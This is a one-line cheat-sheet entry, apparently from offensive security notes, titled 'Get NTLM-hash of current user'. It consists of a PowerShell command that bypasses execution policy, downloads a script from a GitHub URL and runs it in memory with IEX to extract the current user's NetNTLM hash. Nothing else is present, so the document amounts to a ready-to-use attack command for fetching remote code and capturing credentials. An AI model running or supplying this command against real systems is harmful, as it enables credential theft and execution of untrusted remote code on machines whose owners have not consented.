Get NTLM-hash of current user:  
```powershell -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('https://github.com/elnerd/Get-NetNTLM/raw/master/Get-NetNTLM.ps1'); Get-NetNTLM-Hash"```
